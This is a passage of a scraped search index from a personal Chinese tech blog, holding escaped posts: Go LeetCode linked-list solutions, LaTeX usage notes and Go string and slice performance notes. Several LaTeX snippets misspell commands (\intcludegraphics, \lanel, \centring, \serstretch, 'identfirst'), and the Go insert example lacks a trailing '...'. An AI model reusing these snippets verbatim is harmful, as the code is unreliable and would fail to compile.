style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，即当两指针相遇时，从相遇节点和头节点各出发一个指针，当两指针相遇时记为头口节点。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684345828.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func detectCycle(head *ListNode) *ListNode {
    if head == nil {
        return nil
    }
    var fast, slow *ListNode
    fast, slow = head, head

    for true {
        if fast.Next != nil &amp;amp;&amp;amp; fast.Next.Next != nil {
            fast = fast.Next.Next
        } else {
            return nil
        }
        slow = slow.Next
        if fast == slow {
            index1, index2 := head, fast
            for index1 != index2 {
                index1 = index1.Next
                index2 = index2.Next
            }
            return index1
        }
    }
    return nil

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;链表相交&#34;&gt;链表相交※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci/&lt;/p&gt;
&lt;p&gt;思路就是先求出两个链表的长度，求出两链表的差值，然后先让长的链表移动差值步，然后二者一块移动看指针是否相同。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func getIntersectionNode(headA, headB *ListNode) *ListNode {
    
    i, j := 0, 0

    tmp := headA
    for tmp != nil {
        tmp = tmp.Next
        i ++
    }

    tmp = headB
    for tmp != nil {
        tmp = tmp.Next
        j ++
    }

    var tmp1, tmp2 *ListNode
    var k int

    if i &amp;gt; j {
        tmp1 = headA
        tmp2 = headB
        k = i - j
    } else {
        tmp1 = headB
        tmp2 = headA
        k = j - i
    }

    for k &amp;gt; 0 {
        k-- 
        tmp1 = tmp1.Next
    }

    for tmp1 != tmp2 {
        tmp1 = tmp1.Next
        tmp2 = tmp2.Next
    }

    return tmp1

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;删除链表的倒数第n个节点&#34;&gt;删除链表的倒数第N个节点※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/&lt;/p&gt;
&lt;p&gt;双指针首先都指向头节点，快指针先走n步，然后快慢指针再一起走，直到快指针到结尾，那么慢指针下一个元素即时要删除的元素。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func removeNthFromEnd(head *ListNode, n int) *ListNode {
    nilhead := &amp;amp;ListNode{
        0,
        head,
    }

    fast, slow := nilhead, nilhead
    for i := 0; i &amp;lt;= n; i++ {
        fast = fast.Next
    }

    for fast != nil {
        fast = fast.Next
        slow = slow.Next
    }

    slow.Next = slow.Next.Next

    return nilhead.Next
}
&lt;/code&gt;&lt;/pre&gt;
">【数据结构】链表</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/latex/"" data-c="
          &lt;p&gt;Tex是一种语言也是一个排版引擎，但Tex的元命令很难使用，后来有了衍生版Plain Tex、Latex。&lt;/p&gt;
&lt;h3 id=&#34;latex环境&#34;&gt;Latex环境&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在线Latex编辑编译器&lt;/p&gt;
&lt;p&gt;https://www.sharelatex.com/&lt;/p&gt;
&lt;p&gt;https://www.overleaf.com/&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;本地安装&lt;/p&gt;
&lt;p&gt;需要两个软件，一个是latex编译器，一个是IDE。&lt;/p&gt;
&lt;p&gt;编译器：在这里使用Tex Live，它是一个Tex的发行版，包括了编译器，宏包、字体等等。下载地址：&lt;a href=&#34;https://tug.org/texlive/&#34;&gt;Tex Live&lt;/a&gt; &lt;a href=&#34;https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/&#34;&gt;Tex Live清华镜像&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDE：可选项很多，可以参考：https://www.zhihu.com/question/19954023&lt;/p&gt;
&lt;p&gt;借一张图&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640683923593.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;语法&#34;&gt;语法&lt;/h3&gt;
&lt;p&gt;Latex是在一个.tex的源文件中编写。语法主要分为三种：命令、数据、注释。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;命令&lt;/p&gt;
&lt;p&gt;分为普通命令和环境，二者可以相互嵌套。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;普通命令&lt;/p&gt;
&lt;p&gt;以&lt;code&gt;\&lt;/code&gt;起始，大多只有一行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;环境&lt;/p&gt;
&lt;p&gt;包含一对起始声明和结尾声明，用于多行内容的场合。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据&lt;/p&gt;
&lt;p&gt;数据就是普通文本内容。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注释&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;latex结构&#34;&gt;Latex结构&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;物理结构&lt;/p&gt;
&lt;p&gt;指源文件的组织形式，包含序言（preambel）和正文两部分。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;逻辑结构&lt;/p&gt;
&lt;p&gt;指最终输出文档的结构，包括标题、目录、章节等。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;物理结构&#34;&gt;物理结构&lt;/h4&gt;
&lt;p&gt;序言用来完成一些设置，比如指定文档类型，引入宏包，定义命令、环境等。文档的内容则放在正文。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\documentclass[options]{class} % 文档类声明
\usepackage[options]{package} % 引入宏包
...
\begin{document} % 正文
...
\end{document}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;常用的文档类有：article、report、book，options基本常用：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640683986022.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;Latex内核小，很多功能通过宏包来实现。&lt;/p&gt;
&lt;h4 id=&#34;逻辑结构&#34;&gt;逻辑结构&lt;/h4&gt;
&lt;p&gt;一份文档的开头通常有标题、作者、摘要等信息，之后是章节等层次结构，内容则散布于层次结构之间。&lt;/p&gt;
&lt;p&gt;标题、作者、日期等命令要放在&lt;code&gt;\maketitle&lt;/code&gt;命令之前。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\title{LaTex Notes}
\author{}
\date{\today}
\maketitle
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;article和report可以有摘要，book没有，摘要环境用法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{abstract}
...
\end{abstract}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Latex提供了七种层次结构，每个高级层次结构可以包含若干低级层次。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\part{...} 		% level -1
\charpter{...} 	% level 0 article不支持
\section{...} 	% level 1
\subsection{...}% level 2
\subsubsection{...} %level 3
\paragraph{...} % level 4
\subparagraph{...} % level 5
% 如果不想添加层次的标题，可以使用*
\section*{...}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可用&lt;code&gt;\tableofcontents&lt;/code&gt;命令来生成目录，深度可自己制定，例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\setcounter{tocdepth}{2} % 指定深度
\tableofcontents % 列出目录
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以使用如下命令生成插图、表格目录：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\listoffigures
\listoftables
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;初次使用目录、或章节图表等层次结构发生变化时，需要执行两次编译命令。&lt;/p&gt;
&lt;h3 id=&#34;使用&#34;&gt;使用&lt;/h3&gt;
&lt;h4 id=&#34;字符&#34;&gt;字符&lt;/h4&gt;
&lt;p&gt;输入文字字符可分为：普通字符、控制符、特殊字符、预定义字符串、注音符号等。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;普通字符&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;控制符&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#$%^&amp;amp;_{}&lt;/code&gt;等是特殊控制符，使用时需要加上&lt;code&gt;\&lt;/code&gt;，而&lt;code&gt;\&lt;/code&gt;本身要使用&lt;code&gt;\textbackslash&lt;/code&gt;来输入，因为&lt;code&gt;\\&lt;/code&gt;是换行指令。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;特殊字符&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;预定义字符&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684003400.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;
&lt;p&gt;注音符号&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684013268.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;字体设置&#34;&gt;字体设置&lt;/h4&gt;
&lt;p&gt;拉丁文字体主要有三大类：衬线字体、无衬线字体、等宽字体。衬线字体画笔的边缘部分有些修饰，类似于中文的宋体、仿宋等；无衬线字体的画笔是平滑的，类似于中文的黑体。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;% 默认 罗马字体
Hello world
% 粗体
\textbf{Hello world}
% 下划线
\underline{Hello world}
% 斜体
\textit{Hello world}
% 字号
{\tiny Hello world}
{\scriptsize Hello world}
{\footnotesize Hello world}
{\small Hello world}
{\normalsize Hello world}
{\large Hello world}
{\Large Hello world}
{\LARGE Hello world}
{\huge Hello world}
{\Huge Hello world}

&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;换行和换页符&#34;&gt;换行和换页符&lt;/h4&gt;
&lt;p&gt;换行需要两个回车换行，中间夹一个空行。或者在句尾添加&lt;code&gt;\par&lt;/code&gt;、&lt;code&gt;\newline&lt;/code&gt;、&lt;code&gt;\\&lt;/code&gt;也可以实现换行，但&lt;code&gt;newline&lt;/code&gt;和&lt;code&gt;\\&lt;/code&gt;不能形成缩进。&lt;/p&gt;
&lt;p&gt;换页直接添加&lt;code&gt;\newpage&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;长度&#34;&gt;长度&lt;/h4&gt;
&lt;p&gt;Latex的长度单位有：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684025879.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;mark&gt;Latex为排版对象和尺寸和位置定义了一系列宏变量，以便在排版时重用。&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;对齐方式&#34;&gt;对齐方式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;居中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{center}
\end{center}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;左对齐&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{flushleft}
\end{flushleft}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;右对齐&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{flushright}
\end{flushright}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;缩进和段间距&lt;/p&gt;
&lt;p&gt;Latex正文第一个段落缺省不进行首行缩进，可以调用&lt;code&gt;identfirst&lt;/code&gt;宏包使得第一段也缩进首行。段落首行缩进的举例可以用&lt;code&gt;\parindent&lt;/code&gt;变量来控制，段落之间的举例可以用&lt;code&gt;\parskip&lt;/code&gt;变量来控制。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\usepackage{identfirst}
...
\setlength{\parindent}{2em}
\addtolength{\parskip}{3pt}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Latex缺省行间距为单倍行距。可以使用&lt;code&gt;\linespread&lt;/code&gt;命令来控制间距&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\linespread{1.3} % 1.5倍行距
\linespread{1.6} % 2倍行距
% 会把正文和目录脚注图表标题等行距也该了，如果只改正文，需要使用宏包
\usepackage{setspace}
% 该宏包提供了几个环境设置局部行距
\singlespacing
\onehalfspacing
\doublespacing
\serstretch{1.25} % 任意行距

\begin{doublespacing}
... \\ 
...
\end{doublespacing}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;摘录和脚注和边注&#34;&gt;摘录和脚注和边注&lt;/h4&gt;
&lt;p&gt;摘录：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684054841.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;脚注：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684062165.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;边注：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684073387.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;列表&#34;&gt;列表&lt;/h4&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684080512.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上述列表的缺省行间距较大，如要节省空间，可以考虑Bernd Schandl 9的paralist 宏包，它提供了一系列压缩列表和行间列表环境。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684086758.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684093673.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;盒子&#34;&gt;盒子&lt;/h4&gt;
&lt;p&gt;待补充&lt;/p&gt;
&lt;h4 id=&#34;插入图片&#34;&gt;插入图片&lt;/h4&gt;
&lt;p&gt;Latex支持使用点阵图片格式JPEG和PNG，也支持矢量格式EPS和PDF，对于示意图应该首选矢量格式，包含大自然自然彩色的图像应该选JPEG，人工点阵图应该选PNG。&lt;/p&gt;
&lt;p&gt;使用包&lt;code&gt;\usepackage{graphicx}&lt;/code&gt;，然后指定图片路径&lt;code&gt;\graphicspath{{./images/}}&lt;/code&gt;，最后在想要插入图片的地方使用&lt;code&gt;\includegraphics{xxxx.xx}&lt;/code&gt;，如果要设定图片的格式，可使用&lt;code&gt;includegraphics[scale=1.5, angle=45, width=3cm, height=4cm]{xxxx.xx}&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;figure环境&#34;&gt;figure环境&lt;/h5&gt;
&lt;p&gt;对图片的位置进行调整可以使用figure环境：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centring
\includepgraphics{xxx.jpg}
\caption{有图有真相} % 设置插图标题
\label{fig:myphoto} % 放在标题后，表示该插图的引用
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;htbp选项用来指定插图的理想位置，这几个字母分别代表here这里、top页顶、bottom页尾、float page浮动页(专门放浮动环境的单独页面)&lt;/p&gt;
&lt;p&gt;也可以使用这几个字母的任意组合，但不建议单独使用h，因为Latex的排版算法是完美的。&lt;/p&gt;
&lt;h5 id=&#34;插入多幅图&#34;&gt;插入多幅图&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;并排，共享标题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\includegraphics{left.pdf}
\includegraphics{right.pdf}
\caption{xxx}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;并排摆放，各有标题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\begin{minipage}{60pt}
	\includegraphics{left.pdf}
	\caption{left}
\end{minipage}
\hspace{10pt}
\begin{minipage}{60pt}
	\includegraphics{right.pdf}
	\caption{right}
\end{minipage}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;并排摆放，各有标题，各有子标题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\subfloat[subleft title]{
	\label{fig:subfig_a}
	\intcludegraphics{left.pdf}
}
\hspace{10pt}
\subfloat[subright title]{
	\label{fig:subfig_b}
	\intcludegraphics{right.pdf}
}
\caption{title}
\lanel{fig:subfig}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684111509.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;改进&lt;/p&gt;
&lt;p&gt;subfloat缺少宽度参数，而子标题最多和子图一样宽，太长会出现折行，为了避免这种情况，可以在&lt;code&gt;\subfloat&lt;/code&gt;里再嵌套个minipage，因为后者是有宽度设置。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\subfloat[subleft title]{
	\label{fig:subfig_a}
	\begin{minipage}[t]{60pt}
		\centering
		\intcludegraphics{left.pdf}
	\end{minipage}
}
\hspace{10pt}
\subfloat[subright title]{
	\label{fig:subfig_b}
	\begin{minipage}[t]{60pt}
		\centering
		\intcludegraphics{right.pdf}
	\end{minipage}
}
\caption{title}
\lanel{fig:subfig}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数学&#34;&gt;数学&lt;/h3&gt;
&lt;p&gt;添加宏包&lt;code&gt;\usepackage{amsmath}&lt;/code&gt;，公式分为行间模式和独立模式。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684123062.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;其他的数学符号参考：&lt;/p&gt;
&lt;h3 id=&#34;写作模板&#34;&gt;写作模板&lt;/h3&gt;
&lt;p&gt;一些Latex模板的网站：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://www.latextemplates.com/
https://github.com/MartinThoma/LaTeX-examples
http://uk.tug.org/training/thesis/
https://www.overleaf.com/
https://www.latexstudio.net/
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;文件扩展名&#34;&gt;文件扩展名&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684131775.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;中文问题&#34;&gt;中文问题&lt;/h3&gt;
&lt;p&gt;添加宏包&lt;code&gt;\usepackage{xeCJK}&lt;/code&gt;，并切换到XeLatex编译器(以TeXstudio为例)，就可以正常显示中文了。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684138394.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">Latex</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-gao-xing-neng/"" data-c="
          &lt;h3 id=&#34;常见拼接方式&#34;&gt;常见拼接方式&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;code&gt;+&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func plusConcat(n int, str string) string {
    s := &amp;quot;&amp;quot;
    for i := 0; i &amp;lt; n; i++ {
        s += str
    }
    return s
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;code&gt;strings.Builder&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func builderConcat(n int, str string) string {
    var builder strings.Builder
    for i := 0; i &amp;lt; n; i++ {
        builder.WriteString(str)
    }
    return builder.String()
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;code&gt;bytes.Buffer&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func bufferConcat(n int, s string) string {
    buf := new(bytes.Buffer)
    for i := 0; i &amp;lt; n; i++ {
        buf.WriteString(s)
    }
    return buf.String()
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;code&gt;[]byte&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func byteConcat(n int, str string) string {
    buf := make([]byte, 0)
    for i := 0; i &amp;lt; n; i++ {
        buf = append(buf, str...)
    }
    return string(buf)
}
// 如果知道长度，可以提前预分配切片的容量
func preByteConcat(n int, str string) string {
    buf := make([]byte, 0, n*len(str))
    for i := 0; i &amp;lt; n; i++ {
        buf = append(buf, str...)
    }
    return string(buf)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用&lt;code&gt;+&lt;/code&gt;这种方式的效率是最低的，消耗的时间和内存几乎是其他方法的1000倍，其他几种的性能消耗相近，最好的是最后一种，因为在拼接的过程，不需要进行字符串的拷贝，不需要分配新的内存。&lt;/p&gt;
&lt;p&gt;但总和易用性和性能，一般推荐使用&lt;code&gt;strings.Builder&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strings.Builder&lt;/code&gt;也提供了预分配内存的方式Grow：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func builderConcat(n int, str string) string {
	var builder strings.Builder
	builder.Grow(n * len(str))
	for i := 0; i &amp;lt; n; i++ {
		builder.WriteString(str)
	}
	return builder.String()
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt;方式慢原因是因为go语言中字符串是不可变类型，占用内存大小是固定的，当&lt;code&gt;+&lt;/code&gt;拼接2个字符串时，生成一个新的字符串，那么需要开辟一段新的空间，大小是原来两个字符串大小之和。那进行第三次拼接时需要再开辟新的空间，因此需要的时间和内存开销较大。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strings.Builder&lt;/code&gt;，&lt;code&gt;bytes.Buffer&lt;/code&gt;和切片的内存是以倍数申请的。例如需要一个10byte的内存时，当buffer不够时，会自动申请大小为16byte的内存，再次申请时会申请32byte，然后64byte，这样2的倍数增长，但当超过2048byte时申请策略会调整。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;16 32 64 128 256 512 1024 2048 2688 3456 4864 6144 8192 10240 13568 18432 24576 32768 40960 57344 73728 98304 122880
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;strings.Builder&lt;/code&gt;和&lt;code&gt;bytes.Buffer&lt;/code&gt;底层都是&lt;code&gt;[]byte&lt;/code&gt;数组，但前者比后者性能略快10%，一个比较重要的原因是&lt;code&gt;byte.Buffer&lt;/code&gt;转化为字符串时重新申请了一块空间，存放生成的字符串变量，而&lt;code&gt;strings.Builder&lt;/code&gt;直接将底层的&lt;code&gt;[]byte&lt;/code&gt;直接转换成了字符串类型返回了。&lt;/p&gt;
&lt;h3 id=&#34;切片性能&#34;&gt;切片性能&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func make([]T, len, cap) []T
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;len是指定长度，即初始化切片时拥有多少个元素；&lt;/p&gt;
&lt;p&gt;cap是指定容量，即申请的内存的大小，默认等于len。&lt;/p&gt;
&lt;p&gt;当切片容纳的元素的个数超过cap之后就会重新分配内存，并将当前切片所有元素拷贝到新的内存空间上。因此为了减少内存的拷贝次数，容量在比较小的时候，一般以2的倍数扩大的，例如2, 4, 8, ..., 当达到2048时，会采取新的策略，避免申请内存过大浪费空间。&lt;/p&gt;
&lt;h3 id=&#34;切片操作及性能&#34;&gt;切片操作及性能&lt;/h3&gt;
&lt;h4 id=&#34;copy&#34;&gt;copy&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;b = make([]T, len(a))
copy(b, a)
// b = append([]T(nil), a...)
// b = append(a[:0:0], a...)
// O(n)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;append&#34;&gt;append&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;a = append(a, b...)
// 当append后的长度大于cap时，会分配一块更大的区域来容纳新的底层数组
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;delete&#34;&gt;delete&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 删除a[i]
a = append(a[:i], a[i+1:]...)
a = a[:i+copy(a[i:], a[i+1:])]
// O(n)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;deletegc&#34;&gt;delete(gc)&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 删除a[i]
if i &amp;lt; len(a)-1 {
    copy(a[i:], a[i+1:])
}
a[len(a)-1] = nil
a = a[:len(a)-1]
// 将i后的元素前移并删除最后一个元素，有利于垃圾回收
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;insert&#34;&gt;insert&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 在i出插入一个元素
a = append(a[:i], append([]T{x}, a[i:]...))
// O(n)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;filter&#34;&gt;filter&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;n := 0
for _, x := range a{
    if keep(x) {
        a[n] = x
        n++
    }
}
a = a[:n]
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;push&#34;&gt;push&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;a = append(a, x)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;pop&#34;&gt;pop&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;x, a = a[len(a)-1], a[:len(a)-1]
// pop front
x, a = a[0], a[1:]
// 但是这种方式会导致头部的内存不会释放掉
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;切片陷阱&#34;&gt;！切片陷阱&lt;/h3&gt;
&lt;h4 id=&#34;大量内存得不到释放&#34;&gt;大量内存得不到释放&lt;/h4&gt;
